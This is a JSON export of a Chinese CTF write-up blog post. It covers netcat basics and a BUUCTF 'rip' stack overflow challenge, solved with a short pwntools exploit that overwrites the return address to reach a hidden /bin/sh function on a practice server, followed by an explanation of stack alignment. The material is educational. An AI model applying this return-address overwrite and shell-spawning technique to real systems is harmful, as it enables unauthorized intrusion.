{"title":"nc使用与堆栈溢出","uid":"9ff0661d271d78f07f1daca34ed70245","slug":"nc使用与堆栈溢出","date":"2021-05-23T05:47:11.000Z","updated":"2021-05-24T12:05:24.835Z","comments":true,"path":"api/articles/nc使用与堆栈溢出.json","keywords":null,"cover":"https://i.loli.net/2021/05/24/6ewQX9kiC7ZpuOd.jpg","content":"<h1 id=\"test-your-nc\"><a href=\"#test-your-nc\" class=\"headerlink\" title=\"test_your_nc\"></a>test_your_nc</h1><h2 id=\"思路\"><a href=\"#思路\" class=\"headerlink\" title=\"思路\"></a>思路</h2><p>考察nc使用，直接nc连接就可以得到flag了</p>\n<p><img src=\"https://i.loli.net/2021/05/23/m48rSeqP5IodsGA.png\" alt=\"image.png\"></p>\n<h2 id=\"nc介绍\"><a href=\"#nc介绍\" class=\"headerlink\" title=\"nc介绍\"></a>nc介绍</h2><p>nc 是 netcat 的简写，有着网络界的瑞士军刀美誉。因为它短小精悍、功能实用，被设计为一个简单、可靠的网络工具。比如大家很熟悉使用 telnet 测试 tcp 端口，而 nc 可以支持测试 linux 的 tcp 和 udp 端口，而且也经常被用于端口扫描，甚至把 nc 作为 server 以 TCP 或 UDP 方式侦听指定端口做简单的模拟测试。</p>\n<h2 id=\"nc使用\"><a href=\"#nc使用\" class=\"headerlink\" title=\"nc使用\"></a>nc使用</h2><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">nc [-hlnruz][-g&lt;网关...&gt;][-G&lt;指向器数目&gt;][-i&lt;延迟秒数&gt;][-o&lt;输出文件&gt;][-p&lt;通信端口&gt;][-s&lt;来源位址&gt;][-v...][-w&lt;超时秒数&gt;][主机名称][通信端口...]</span><br></pre></td></tr></table></figure>\n\n<p>nc 的作用：</p>\n<ol>\n<li>实现任意 TCP/UDP 端口的侦听，nc 可以作为 server 以 TCP 或 UDP 方式侦听指定端口</li>\n<li>端口的扫描，nc 可以作为 client 发起 TCP 或 UDP 连接</li>\n<li>机器之间传输文件</li>\n<li>机器之间网络测速</li>\n</ol>\n<p>nc 的控制参数不少，常用的几个参数如下所列：</p>\n<ul>\n<li><p>-l ：用于指定 nc 将处于侦听模式。指定该参数，则意味着 nc 被当作 server，侦听并接受连接，而非向其它地址发起连接。</p>\n</li>\n<li><p>-p：暂未用到（老版本的 nc 可能需要在端口号前加 - p 参数）</p>\n</li>\n<li><p>-s：指定发送数据的源 IP 地址，适用于多网卡机</p>\n</li>\n<li><p>-u：指定 nc 使用 UDP 协议，默认为 TCP</p>\n</li>\n<li><p>-v：输出交互或出错信息，新手调试时尤为有用</p>\n</li>\n<li><p>-w：超时秒数，后面跟数字</p>\n</li>\n<li><p>-z：表示 zero，表示扫描时不发送任何数据</p>\n</li>\n</ul>\n<h1 id=\"rip\"><a href=\"#rip\" class=\"headerlink\" title=\"rip\"></a>rip</h1><h2 id=\"思路-1\"><a href=\"#思路-1\" class=\"headerlink\" title=\"思路\"></a>思路</h2><p>首先查看附件，发现没开什么保护，丢进IDA里面看一下</p>\n<p><img src=\"https://i.loli.net/2021/05/23/vPpXGYRlquMrOWh.png\" alt=\"image.png\"></p>\n<p>发现可疑fun函数，点进去可以发现函数调用了/bin/sh，于是我们可以利用这个函数得到flag<img src=\"https://i.loli.net/2021/05/23/Gzj4Jyef3P9tLq2.png\" alt=\"image.png\"></p>\n<p>接下来就可以开始调试了。首先创造一个长度为150的字符串，运行该程序，将那个字符串输入进去<img src=\"https://i.loli.net/2021/05/23/WvfGUnBq1NhFZjQ.png\" alt=\"image.png\"></p>\n<p>之后程序直接报错，因为return地址处不是一个正确的地址值，无法跳转。通过return的那个地址值，我们可以计算return距离输入点的长度。使用cyclic计算偏移量<img src=\"https://i.loli.net/2021/05/23/odKI89vOWRDAuEZ.png\" alt=\"image.png\"></p>\n<p>得到偏移量就可以写exp了</p>\n<h2 id=\"编写EXP\"><a href=\"#编写EXP\" class=\"headerlink\" title=\"编写EXP\"></a>编写EXP</h2><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\">p = remote(<span class=\"string\">&#x27;node3.buuoj.cn&#x27;</span>,<span class=\"number\">28652</span>)</span><br><span class=\"line\">fun = <span class=\"number\">0x401186</span></span><br><span class=\"line\">payload = <span class=\"string\">&#x27;a&#x27;</span>*<span class=\"number\">23</span>+p64(fun+<span class=\"number\">1</span>)</span><br><span class=\"line\">p.sendline(payload)</span><br><span class=\"line\">p.interactive()</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"分析EXP\"><a href=\"#分析EXP\" class=\"headerlink\" title=\"分析EXP\"></a>分析EXP</h2><p>解释一下fun加一的原因：首先要明确使用完堆栈需要将堆栈恢复，也就是堆栈平衡，如果堆栈没有平衡就会发生一系列错误。明确以后就可以往下看了，首先了解一下ret指令的工作原理：执行ret指令系统会将esp指向堆栈的值赋给eip之后esp会增加。如下图：<img src=\"https://i.loli.net/2021/05/24/o69SHFunkLCiGev.png\" alt=\"image.png\"></p>\n<p>我们可以看堆栈图表，正常情况下，执行完ret指令esp最终会指向参数区，而溢出情况一个是跳过push ebp一个没有跳过，而没跳过就会导致堆栈不平衡就会报错。<img src=\"https://i.loli.net/2021/05/24/XQECavZpDPBdnsl.png\" alt=\"image.png\"></p>\n<p>为什么会有push ebp呢？这就要看fun函数对应的汇编代码，如下图，如果我们直接跳转到fun函数第一条指令就是push rbp（忘了是64位，加上比较懒就没改了），所以就会导致堆栈不平衡，导致出错。所以为了解决这个问题，可以选择跳过这条指令，这也就是fun地址加一的原因<img src=\"https://i.loli.net/2021/05/24/BT5Qk6oalwyVuPZ.png\" alt=\"image.png\"></p>\n","feature":true,"text":"test_your_nc思路考察nc使用，直接nc连接就可以得到flag了 nc介绍nc 是 netcat 的简写，有着网络界的瑞士军刀美誉。因为它短小精悍、功能实用，被设计为一个简单、可靠的网络工具。比如大家很熟悉使用 telnet 测试 tcp 端口，而 nc 可以支持测试 ...","link":"","photos":[],"count_time":{"symbolsCount":"1.5k","symbolsTime":"1 mins."},"categories":[{"name":"PWN","slug":"PWN","count":2,"path":"api/categories/PWN.json"}],"tags":[{"name":"wp","slug":"wp","count":3,"path":"api/tags/wp.json"}],"toc":"<ol class=\"toc\"><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#test-your-nc\"><span class=\"toc-text\">test_your_nc</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E6%80%9D%E8%B7%AF\"><span class=\"toc-text\">思路</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#nc%E4%BB%8B%E7%BB%8D\"><span class=\"toc-text\">nc介绍</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#nc%E4%BD%BF%E7%94%A8\"><span class=\"toc-text\">nc使用</span></a></li></ol></li><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#rip\"><span class=\"toc-text\">rip</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E6%80%9D%E8%B7%AF-1\"><span class=\"toc-text\">思路</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E7%BC%96%E5%86%99EXP\"><span class=\"toc-text\">编写EXP</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E5%88%86%E6%9E%90EXP\"><span class=\"toc-text\">分析EXP</span></a></li></ol></li></ol>","author":{"name":"Krito","slug":"blog-author","avatar":"https://i.loli.net/2021/05/05/GFiJQZM1pxK3AyC.jpg","link":"/","description":"不要等待，时机永远不会恰到好处。","socials":{"github":"https://github.com/Eli0t-g","twitter":"https://twitter.com/home","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"https://www.zhihu.com/people/wu-sheng-85-17-66","csdn":"https://blog.csdn.net/qq_52053150?spm=1000.2115.3001.5343","juejin":"","customs":{}}},"mapped":true,"prev_post":{},"next_post":{"title":"CISCN复现","uid":"dde0577c288faf648c0d6f90bbb39dc6","slug":"CISCN复现","date":"2021-05-18T11:25:16.000Z","updated":"2021-05-23T05:52:38.991Z","comments":true,"path":"api/articles/CISCN复现.json","keywords":null,"cover":"https://i.loli.net/2021/05/18/oDJvw6ieQjbXmrq.jpg","text":"前言初次参加这种大型比赛，给我的感觉就是题目出的挺不错（一题都没做出来），但是这个比赛形式着实令人不解。不仅如此，在写完选择题后系统崩溃也是我没想得到（虽然没有停滞很久，但是感觉很意外，毕竟是国赛）。 MISC隔空传话附件是一个txt文件，里面全是十六进制码，根据题目搜索发现是P...","link":"","photos":[],"count_time":{"symbolsCount":"1.8k","symbolsTime":"2 mins."},"categories":[{"name":"MISC","slug":"MISC","count":3,"path":"api/categories/MISC.json"}],"tags":[{"name":"wp","slug":"wp","count":3,"path":"api/tags/wp.json"}],"author":{"name":"Krito","slug":"blog-author","avatar":"https://i.loli.net/2021/05/05/GFiJQZM1pxK3AyC.jpg","link":"/","description":"不要等待，时机永远不会恰到好处。","socials":{"github":"https://github.com/Eli0t-g","twitter":"https://twitter.com/home","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"https://www.zhihu.com/people/wu-sheng-85-17-66","csdn":"https://blog.csdn.net/qq_52053150?spm=1000.2115.3001.5343","juejin":"","customs":{}}},"feature":true}}